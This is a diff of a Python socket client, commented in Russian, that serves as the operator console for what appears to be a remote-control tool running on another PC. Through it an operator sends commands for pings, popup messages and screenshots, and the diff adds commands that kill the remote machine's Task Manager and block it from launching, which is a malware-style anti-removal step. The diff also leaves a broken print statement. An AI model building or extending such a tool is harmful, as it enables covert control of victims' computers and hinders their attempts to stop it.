@@ -1,14 +1,19 @@
 import socket
 import os, io
 from colorama import Fore, Style, init
+import baner
+import threading
 
 # Настройки клиента
-SERVER_HOST = '192.168.0.97'  # IP второго ПК
+SERVER_HOST = '192.168.0.57'  # IP второго ПК
 SERVER_PORT = 8080             # Тот же порт, что и на сервере
 
 client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 client_socket.connect((SERVER_HOST, SERVER_PORT))
-print("Подключено к серверу.")
+print("ok")
+
+
+
 
 while True:
     # Ввод команды
@@ -50,9 +55,21 @@ while True:
     print(Fore.GREEN + "11. ping <адрес> - выполнить пинг указанного адреса.")
     print(Fore.GREEN + "12. show_message <текст> - показать всплывающее сообщение.")
     print(Fore.GREEN + "13. screenshot - зделать скриншот.")
+    print(Fore.GREEN + "14. task_manager - завершает процес диспетчера задач")
+    print(Fore.GREEN + "15. task_manager_disab - не даёт запустить диспитчер задач")
+    print(Fore.GREEN + "16. task_manager_enab - включает диспитчер задач")
+
     #print(Fore.GREEN + "31. screenshot - создать скриншот и сохранить на сервере.")
     print(Fore.GREEN + "exit. - выйти из программы.")
     print(Fore.GREEN + "server_close. - принудительно закрыть сервер.")
+
+    #print(Fore.GREEN "")
+
+#print(Fore.GREEN + "\n")
+    
+    # print(baner.logo)
+    # print(Fore.GREEN + "\n[0] - Начать чат" + "\n[1] - pyvir")
+    
 
 
     command = input("Введите команду: ").strip()
@@ -60,8 +77,10 @@ while True:
     client_socket.send(command.encode("utf-8"))
     print("--")
 
+
     if command.lower() == 'exit':
-        print("Выход из программы.")
+        print
+        ("Выход из программы.")
         break
 
     # Обработка специальных команд
@@ -102,5 +121,7 @@ while True:
     # Получение результата
     result = client_socket.recv(4096).decode("utf-8")
     print("Результат выполнения:\n", result)
+    
+    
 
 client_socket.close()
